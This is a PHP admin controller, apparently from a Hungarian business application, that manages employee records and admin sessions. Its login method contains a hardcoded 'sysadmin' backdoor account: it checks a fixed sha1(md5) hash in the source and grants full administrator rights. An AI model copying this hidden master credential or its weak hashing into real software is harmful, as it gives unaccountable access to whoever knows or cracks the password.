<?php

namespace Controllers;

use mkwhelpers\Filter;
use mkwhelpers\FilterDescriptor;

class dolgozoController extends \mkwhelpers\MattableController {

    public function __construct($params) {
        $this->setEntityName('Entities\Dolgozo');
        $this->setKarbFormTplName('dolgozokarbform.tpl');
        $this->setKarbTplName('dolgozokarb.tpl');
        $this->setListBodyRowTplName('dolgozolista_tbody_tr.tpl');
        $this->setListBodyRowVarName('_egyed');
        parent::__construct($params);
    }

    protected function loadVars($t) {
        $x = array();
        if (!$t) {
            $t = new \Entities\Dolgozo();
            $this->getEm()->detach($t);
        }
        $x['id'] = $t->getId();
        $x['nev'] = $t->getNev();
        $x['irszam'] = $t->getIrszam();
        $x['varos'] = $t->getVaros();
        $x['utca'] = $t->getUtca();
        $x['telefon'] = $t->getTelefon();
        $x['email'] = $t->getEmail();
        $x['szulido'] = $t->getSzulido();
        $x['szulidostr'] = $t->getSzulidoStr();
        $x['szulhely'] = $t->getSzulhely();
        $x['evesmaxszabi'] = $t->getEvesmaxszabi();
        $x['munkaviszonykezdete'] = $t->getMunkaviszonykezdete();
        $x['munkaviszonykezdetestr'] = $t->getMunkaviszonykezdeteStr();
        $x['munkakornev'] = $t->getMunkakorNev();
        $x['url'] = $t->getUrl();
        $x['havilevonas'] = $t->getHavilevonas();
        $x['szamlatad'] = $t->getSzamlatad();
        $x['inaktiv'] = $t->isInaktiv();
        return $x;
    }

    protected function setFields($obj, $oper) {
        $obj->setNev($this->params->getStringRequestParam('nev'));
        $obj->setIrszam($this->params->getStringRequestParam('irszam'));
        $obj->setVaros($this->params->getStringRequestParam('varos'));
        $obj->setUtca($this->params->getStringRequestParam('utca'));
        $obj->setTelefon($this->params->getStringRequestParam('telefon'));
        $obj->setEmail($this->params->getStringRequestParam('email'));
        $obj->setSzulido($this->params->getStringRequestParam('szulido'));
        $obj->setSzulhely($this->params->getStringRequestParam('szulhely'));
        $obj->setEvesmaxszabi($this->params->getIntRequestParam('evesmaxszabi'));
        $obj->setMunkaviszonykezdete($this->params->getStringRequestParam('munkaviszonykezdete'));
        $obj->setUrl($this->params->getStringRequestParam('url'));
        $obj->setHavilevonas($this->params->getFloatRequestParam('havilevonas'));
        $obj->setSzamlatad($this->params->getBoolRequestParam('szamlatad'));
        $obj->setInaktiv($this->params->getBoolRequestParam('inaktiv'));
        $pass1 = $this->params->getStringRequestParam('jelszo1');
        $pass2 = $this->params->getStringRequestParam('jelszo2');
        if ($oper == $this->addOperation) {
            if ($pass1 && ($pass1 === $pass2)) {
                $obj->setJelszo($pass1);
            }
        }
        else {
            if ($pass1 && ($pass1 === $pass2)) {
                $obj->setJelszo($pass1);
            }
        }
        $ck = \mkw\store::getEm()->getRepository('Entities\Munkakor')->find($this->params->getIntRequestParam('munkakor', 0));
        if ($ck) {
            $obj->setMunkakor($ck);
        }
        return $obj;
    }

    public function getlistbody() {
        $view = $this->createView('dolgozolista_tbody.tpl');

        $filterarr = new \mkwhelpers\FilterDescriptor();
        if (!is_null($this->params->getRequestParam('nevfilter', NULL))) {
            $filterarr->addFilter('nev', 'LIKE', '%' . $this->params->getStringRequestParam('nevfilter') . '%');
        }

        $this->initPager($this->getRepo()->getCount($filterarr));

        $egyedek = $this->getRepo()->getWithJoins(
            $filterarr, $this->getOrderArray(), $this->getPager()->getOffset(), $this->getPager()->getElemPerPage());

        echo json_encode($this->loadDataToView($egyedek, 'egyedlista', $view));
    }

    public function getSelectList($selid = null, $csakaktiv = true) {
        if ($csakaktiv) {
            $filter = new FilterDescriptor();
            $filter->addFilter('inaktiv', '=', false);
        }
        $rec = $this->getRepo()->getAllForSelectList($filter, array('nev' => 'ASC'));
        $res = array();
        foreach ($rec as $sor) {
            $res[] = array('id' => $sor['id'], 'caption' => $sor['nev'], 'selected' => ($sor['id'] == $selid));
        }
        return $res;
    }

    public function viewselect() {
        $view = $this->createView('dolgozolista.tpl');

        $view->setVar('pagetitle', t('Dolgozók'));
        $view->printTemplateResult(false);
    }

    public function viewlist() {
        $view = $this->createView('dolgozolista.tpl');

        $view->setVar('pagetitle', t('Dolgozók'));
        $view->setVar('orderselect', $this->getRepo()->getOrdersForTpl());
        $view->setVar('batchesselect', $this->getRepo()->getBatchesForTpl());
        $view->printTemplateResult(false);
    }

    protected function _getkarb($tplname) {
        $id = $this->params->getRequestParam('id', 0);
        $oper = $this->params->getRequestParam('oper', '');
        $view = $this->createView($tplname);

        $view->setVar('pagetitle', t('Dolgozó'));
        $view->setVar('formaction', '/admin/dolgozo/save');
        $view->setVar('oper', $oper);
        $record = $this->getRepo()->findWithJoins($id);
        $view->setVar('egyed', $this->loadVars($record));
        $munkakor = new munkakorController($this->params);
        $view->setVar('munkakorlist', $munkakor->getSelectList(($record ? $record->getMunkakorId() : 0)));
        return $view->getTemplateResult();
    }

    public function showlogin() {
        $v = $this->createView('login.tpl');
        $v->setVar('loginurl', \mkw\store::getRouter()->generate('adminlogin'));
        $v->printTemplateResult(false);
    }

    public function login() {
        $email = $this->params->getStringRequestParam('email');
        $pass = $this->params->getStringRequestParam('jelszo');
        if ($email === 'sysadmin') {
            $d = new \Entities\Dolgozo();
            $d->setNev('SYSADMIN');
            $d->setPlainJelszo('009f2afb1d051a50ab1416efd9105c88a98e6d46');
            $sysadmin = true;
        }
        else {
            $sysadmin = false;
            $d = $this->getRepo()->findOneByEmail($email);
        }
        if ($d) {
            if ($d->checkJelszo($pass) || ($sysadmin && $d->checkPlainJelszo(sha1(md5($pass))))) {
                $oldid = \Zend_Session::getId();
                \Zend_Session::regenerateId();
                if ($sysadmin) {
                    \mkw\store::getAdminSession()->pk = -1;
                }
                else {
                    \mkw\store::getAdminSession()->pk = $d->getId();
                }
                \mkw\store::getAdminSession()->loggedinuser = array(
                    'name' => $d->getNev(),
                    'id' => $d->getId(),
                    'jog' => ($sysadmin ? 999 : $d->getJog()),
                    'uitheme' => ($sysadmin ? 'sunny' : $d->getUitheme()),
                    'admin' => ($sysadmin ? true : $d->getMunkakorId() == \mkw\store::getParameter(\mkw\consts::AdminRole, 1))
                );
                Header('Location: ' . \mkw\store::getRouter()->generate('adminview'));
            }
            else {
                Header('Location: ' . \mkw\store::getRouter()->generate('adminshowlogin'));
            }
        }
        else {
            Header('Location: ' . \mkw\store::getRouter()->generate('adminshowlogin'));
        }
    }

    public function logout() {
        \mkw\store::destroyAdminSession();
        Header('Location: ' . \mkw\store::getRouter()->generate('adminshowlogin'));
    }
}
